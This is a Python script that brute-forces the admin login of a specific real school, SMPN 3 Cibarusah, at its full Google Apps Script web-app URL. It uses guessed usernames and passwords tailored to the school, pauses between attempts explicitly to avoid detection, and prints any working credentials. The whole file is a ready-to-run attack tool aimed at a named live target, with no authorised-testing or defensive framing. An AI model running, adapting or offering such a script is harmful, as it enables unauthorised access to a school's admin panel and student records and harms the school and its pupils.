#!/usr/bin/env python3
"""
Google Apps Script Admin Brute Force
Target: SMPN 3 Cibarusah Admin Panel
"""

import requests
import time
from itertools import product
import sys

# Target URL
BASE_URL = "https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"

# Common usernames for school systems
USERNAMES = [
    'admin',
    'administrator',
    'root',
    'smpn3',
    'cibarusah',
    'smpnegeri3',
    'sekolah',
    'guru',
    'operator',
    'admin123',
    'adminsekolah'
]

# Common passwords for Indonesian school systems
PASSWORDS = [
    'admin',
    'admin123',
    'password',
    'password123',
    '123456',
    '12345678',
    'admin2024',
    'admin2025',
    'admin2026',
    'smpn3',
    'cibarusah',
    'sekolah123',
    'Smpn3Cibarusah',
    'SMPN3Cibarusah',
    'adminSMPN3',
    'smpn3cibarusah',
    'P@ssw0rd',
    'Admin@123',
    'Sekolah123',
    'Guru123'
]

def banner():
    print("""
╔═══════════════════════════════════════════════════╗
║   Google Apps Script Admin Brute Force           ║
║   Target: SMPN 3 Cibarusah                       ║
╚═══════════════════════════════════════════════════╝
    """)

def test_login(username, password):
    """Test a single username/password combination"""
    try:
        # Try POST method
        response = requests.post(
            BASE_URL,
            data={
                'page': 'admin',
                'username': username,
                'password': password,
                'action': 'login'
            },
            allow_redirects=True,
            timeout=10
        )
        
        # Check for success indicators
        success_indicators = [
            'dashboard',
            'berhasil',
            'welcome',
            'logout',
            'admin panel',
            'data siswa'
        ]
        
        response_lower = response.text.lower()
        
        for indicator in success_indicators:
            if indicator in response_lower:
                return True, response.status_code, len(response.text)
        
        # Check status code
        if response.status_code == 200 and len(response.text) > 5000:
            # Likely successful login (large response = dashboard)
            return True, response.status_code, len(response.text)
            
        return False, response.status_code, len(response.text)
        
    except Exception as e:
        return False, 0, 0

def brute_force(wordlist_file=None):
    """Main brute force function"""
    banner()
    
    if wordlist_file:
        print(f"[*] Loading custom wordlist: {wordlist_file}")
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                custom_passwords = [line.strip() for line in f if line.strip()]
            passwords = custom_passwords
        except FileNotFoundError:
            print(f"[!] Wordlist file not found: {wordlist_file}")
            print("[*] Using default password list")
            passwords = PASSWORDS
    else:
        passwords = PASSWORDS
    
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Usernames: {len(USERNAMES)}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Total combinations: {len(USERNAMES) * len(passwords)}")
    print("[*] Starting brute force attack...\n")
    
    attempt = 0
    total = len(USERNAMES) * len(passwords)
    
    for username, password in product(USERNAMES, passwords):
        attempt += 1
        
        print(f"[{attempt}/{total}] Testing: {username}:{password}", end='')
        
        success, status, length = test_login(username, password)
        
        if success:
            print(f" ✓ SUCCESS!")
            print("\n" + "="*60)
            print(f"[+] CREDENTIALS FOUND!")
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")
            print(f"[+] URL: {BASE_URL}?page=admin")
            print("="*60)
            return username, password
        else:
            print(f" ✗ Failed (Status: {status}, Length: {length})")
        
        # Rate limiting to avoid detection
        time.sleep(0.5)
    
    print("\n[!] No valid credentials found in this attack")
    return None, None

def main():
    if len(sys.argv) > 1:
        wordlist = sys.argv[1]
        print(f"[*] Using custom wordlist: {wordlist}")
        brute_force(wordlist)
    else:
        print("[*] No wordlist specified, using default passwords")
        print("[*] Usage: python3 brute_admin.py [wordlist.txt]")
        print()
        brute_force()

if __name__ == "__main__":
    main()
